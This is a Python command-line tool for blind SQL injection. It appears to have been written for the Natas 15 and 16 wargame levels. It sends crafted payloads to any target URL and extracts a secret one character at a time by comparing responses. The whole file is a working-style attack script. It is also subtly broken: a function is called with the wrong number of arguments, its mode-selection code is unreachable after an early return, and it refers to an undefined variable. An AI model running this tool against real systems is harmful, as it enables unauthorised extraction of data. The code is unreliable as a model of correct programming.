#!/usr/bin/env python3
import argparse
import requests
import string
import time

# -------------------------------
# Argument Parsing
# -------------------------------

def parse_args():
    parser = argparse.ArgumentParser(
        description="Generic Blind SQL Injection Extractor"
    )

    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--user", required=True, help="HTTP auth username")
    parser.add_argument("--password", required=True, help="HTTP auth password")
    parser.add_argument("--param", required=True, help="Vulnerable parameter name")
    parser.add_argument("--true-string", default="", help="String indicating TRUE condition (for boolean-based)")
    parser.add_argument("--payload-template", required=True, help="Payload template using {char} and/or {pos}")
    parser.add_argument("--max-length", type=int, default=32, help="Maximum length of extracted value")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests")

    return parser.parse_args()


# -------------------------------
# Core Logic
# -------------------------------

def send_payload(url, auth, param, payload, baseline_len):
    r = requests.get(
        url,
        params={param: payload},
        auth=auth,
        timeout=10
    )

    return len(r.text) < baseline_len

    # Mode 1: explicit success string (Natas 15)
    if true_string:
        return true_string in r.text

    # Mode 2: output-length comparison (Natas 16)
    return len(r.text) > baseline_len


def extract_secret(args):
    charset = string.ascii_letters + string.digits
    extracted = ""

    print("[*] Starting blind SQL injection...\n")

    # Establish baseline for output-length comparison
    baseline_payload = args.payload_template.format(char="Z")
    baseline_resp = requests.get(
        args.url,
        params={args.param: baseline_payload},
        auth=(args.user, args.password),
        timeout=10
    )
    baseline_len = len(baseline_resp.text)

    for pos in range(1, args.max_length + 1):
        found = False

        for ch in charset:
            payload = args.payload_template.format(
                char=ch,
                pos=pos
            )

            if send_payload(
                args.url,
                (args.user, args.password),
                args.param,
                payload,
                args.true_string,
                baseline_len,
            ):
                extracted += ch
                print(f"[+] Position {pos}: {ch}  ->  {extracted}")
                found = True
                break

            if args.delay:
                time.sleep(args.delay)

        if not found:
            print(f"[!] No character found at position {pos}. Stopping.")
            break

    print("\n[✓] Extraction complete:")
    print(extracted)


# -------------------------------
# Entry Point
# -------------------------------

if __name__ == "__main__":
    args = parse_args()
    extract_secret(args)
